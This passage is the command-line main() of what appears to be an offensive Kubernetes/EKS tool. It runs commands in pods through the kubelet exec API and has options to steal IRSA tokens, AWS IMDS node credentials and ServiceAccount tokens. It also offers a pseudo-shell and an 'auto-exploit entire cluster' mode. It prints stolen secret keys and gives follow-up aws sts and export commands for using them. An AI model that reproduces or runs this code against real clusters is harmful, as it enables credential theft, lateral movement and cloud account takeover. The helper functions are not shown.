    -n kube-system -p aws-node-xxxxx -c aws-node --steal-imds
""",
    )

    conn = parser.add_mutually_exclusive_group(required=False)
    conn.add_argument("--server", help="K8s/EKS API server URL")
    conn.add_argument("--direct", help="Direct kubelet URL (https://NODE_IP:10250)")
    conn.add_argument("--kubeconfig", help="Path to kubeconfig file (auto-extracts server + token)")

    parser.add_argument("--token", help="Bearer token (optional if using --kubeconfig)")
    parser.add_argument("--node", help="Target node name")

    parser.add_argument("-n", "--namespace", help="Target pod namespace")
    parser.add_argument("-p", "--pod", help="Target pod name")
    parser.add_argument("-c", "--container", help="Target container name")

    parser.add_argument("--command", help="Command to run (e.g., 'env', 'id', 'cat /etc/passwd')")
    parser.add_argument("--recon", action="store_true", help="Enumerate all pods on a node")
    parser.add_argument("--auto", action="store_true", help="Auto-exploit entire cluster")
    parser.add_argument("--interactive", action="store_true", help="Interactive pseudo-shell")
    parser.add_argument("--steal-irsa", action="store_true", help="Steal IRSA token from target pod")
    parser.add_argument("--steal-imds", action="store_true", help="Steal IMDS node creds via target pod")
    parser.add_argument("--steal-sa", action="store_true", help="Steal K8s ServiceAccount token")
    parser.add_argument("--timeout", type=int, default=15, help="WebSocket timeout seconds (default: 15)")
    parser.add_argument("--setup", action="store_true", help="Print installation instructions and exit")

    args = parser.parse_args()

    # ── Setup mode: print install instructions and exit ──
    if args.setup:
        print_setup()
        return

    # ── Check all dependencies before doing anything ──
    check_dependencies()

    # ── Validate connection arg was provided ──
    if not args.server and not args.direct and not args.kubeconfig:
        parser.error("one of the arguments --server --direct --kubeconfig is required (or use --setup)")

    # ── Resolve connection params ──
    server = args.server
    direct = args.direct
    token = args.token

    # --kubeconfig: extract server + token from file
    if args.kubeconfig:
        kc_server, kc_token = parse_kubeconfig(args.kubeconfig)
        server = kc_server
        if not token:
            token = kc_token
        if not server:
            print(f"[!] Could not extract server URL from {args.kubeconfig}")
            sys.exit(1)
        if not token:
            print(f"[!] Could not extract token from {args.kubeconfig}")
            print(f"    Hint: pass --token explicitly, or ensure the kubeconfig has a static token")
            sys.exit(1)

    # Validate token exists
    if not token:
        print("[!] No token provided. Use --token or --kubeconfig.")
        sys.exit(1)

    via_apiserver = server is not None

    banner()
    if via_apiserver:
        source = "kubeconfig" if args.kubeconfig else "CLI"
        print(f"[*] Server: {server} ({source})")
    else:
        print(f"[*] Direct Kubelet: {direct}")
    print(f"[*] Token: {token[:30]}...")

    # ── Preflight: verify permissions before running ──
    preflight_check(server, direct, token, node=args.node)

    # ── Auto Mode ──
    if args.auto:
        if not via_apiserver:
            print("[!] --auto requires --server or --kubeconfig")
            sys.exit(1)
        do_auto(server, token)
        return

    # ── Recon Mode ──
    if args.recon:
        if via_apiserver:
            if not args.node:
                print("[!] --recon with --server requires --node")
                sys.exit(1)
            do_recon(server, token, args.node)
        else:
            pods = list_pods_direct(direct, token)
            items = pods.get("items", [])
            print(f"[+] {len(items)} pods:")
            for p in items:
                ns = p["metadata"]["namespace"]
                name = p["metadata"]["name"]
                cs = [c["name"] for c in p["spec"]["containers"]]
                print(f"  {ns}/{name} {cs}")
        return

    # ── Resolve kubelet URL ──
    need_target = not args.auto and not args.recon
    if need_target and not all([args.namespace, args.pod, args.container]):
        print("[!] Need -n, -p, -c for exec/steal commands")
        sys.exit(1)
    if need_target and via_apiserver and not args.node:
        print("[!] Need --node when using --server (to resolve kubelet IP)")
        sys.exit(1)

    kubelet_url = direct
    if via_apiserver:
        print(f"[*] Resolving kubelet IP for node: {args.node}...")
        node_ip = None
        try:
            node_ip = get_node_ip(server, token, args.node)
        except RuntimeError:
            print(f"{YELLOW}[!] 'get nodes' denied — falling back to pod hostIP extraction...{RESET}")
        if not node_ip:
            # Fallback: get IP from pod.status.hostIP via nodes/proxy
            node_ip = get_node_ip_from_pods(server, token, args.node)
        if not node_ip:
            print(f"[!] Could not resolve IP for {args.node}")
            print(f"    Hint: Use --direct https://<node-ip>:10250 instead")
            sys.exit(1)
        kubelet_url = f"https://{node_ip}:10250"
        print(f"[*] Kubelet: {kubelet_url}")

    ns, pod, container = args.namespace, args.pod, args.container

    # ── Steal IRSA ──
    if args.steal_irsa:
        print(f"\n{BOLD}[*] Stealing IRSA token from {ns}/{pod}...{RESET}")
        irsa = steal_irsa_token(kubelet_url, token, ns, pod, container)
        if irsa:
            print(f"{RED}[!!!] IRSA Token:{RESET}")
            print(irsa)
            print(f"\n{YELLOW}[*] Decode: echo '{irsa}' | cut -d. -f2 | base64 -d 2>/dev/null | jq .{RESET}")
            print(f"{YELLOW}[*] Use with: aws sts assume-role-with-web-identity --role-arn <ROLE_ARN> --role-session-name exploit --web-identity-token <TOKEN>{RESET}")
        else:
            print("[-] No IRSA token found (pod may not have IRSA annotation)")
        # Also show AWS env vars
        aws_env = get_aws_env(kubelet_url, token, ns, pod, container)
        if aws_env:
            print(f"\n{YELLOW}[*] AWS env vars in pod:{RESET}")
            for k, v in aws_env.items():
                print(f"  {k}={v}")
        return

    # ── Steal IMDS ──
    if args.steal_imds:
        print(f"\n{BOLD}[*] Stealing IMDS creds via {ns}/{pod}...{RESET}")
        imds = steal_imds_creds(kubelet_url, token, ns, pod, container)
        if "AccessKeyId" in imds:
            print(f"{RED}[!!!] AWS Node Credentials:{RESET}")
            print(f"  Role:            {imds['role']}")
            print(f"  AccessKeyId:     {imds['AccessKeyId']}")
            print(f"  SecretAccessKey: {imds['SecretAccessKey']}")
            print(f"  Token:           {imds['Token']}")
            print(f"\n{YELLOW}[*] Use with:{RESET}")
            print(f"  export AWS_ACCESS_KEY_ID={imds['AccessKeyId']}")
            print(f"  export AWS_SECRET_ACCESS_KEY={imds['SecretAccessKey']}")
            print(f"  export AWS_SESSION_TOKEN=<full-token>")
            print(f"  aws sts get-caller-identity")
        else:
            print(f"[-] {imds.get('error', 'Failed')}")
        return

    # ── Steal SA Token ──
    if args.steal_sa:
        print(f"\n{BOLD}[*] Stealing SA token from {ns}/{pod}...{RESET}")
        sa = steal_sa_token(kubelet_url, token, ns, pod, container)
        if sa:
            print(f"{GREEN}[+] K8s SA Token:{RESET}")
            print(sa)
            print(f"\n{YELLOW}[*] Test: kubectl auth can-i --list --token='{sa[:40]}...'{RESET}")
        else:
            print("[-] No SA token found")
        return

    # ── Interactive ──
    if args.interactive:
        do_interactive(kubelet_url, token, ns, pod, container)
        return

    # ── Command Exec ──
    if args.command:
        stdout, stderr, status = exec_command(
            kubelet_url, token, ns, pod, container, args.command, args.timeout
        )
        if stdout:
            print(stdout, end="")
        if stderr:
            print(stderr, end="", file=sys.stderr)
        success = status and status.get("status") == "Success"
        sys.exit(0 if success else 1)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
